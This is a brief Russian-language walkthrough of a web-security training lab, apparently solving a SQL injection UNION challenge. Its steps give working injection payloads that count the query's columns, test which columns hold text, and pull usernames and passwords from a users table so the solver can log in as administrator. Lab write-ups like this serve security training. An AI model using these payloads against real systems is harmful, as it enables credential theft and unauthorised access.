## Lab: SQL injection UNION attack, retrieving data from other tables
1) Переходим на сайт задания и заходим в раздел Pets
2) Убедимся, что запрос возвращает два столбца, отправив строку category=Pets'+UNION+SELECT+NULL,NULL--
3) Убедимся, что оба столбца содержат текст, отправив category=Pets'+UNION+SELECT+'abc','def'--
4) Используем следующий запрос для извлечения данных из таблицы users: category=Pets'+UNION+SELECT+username,password+FROM+users--
5) Находим пароль от administrator и входим в систему

Готово!
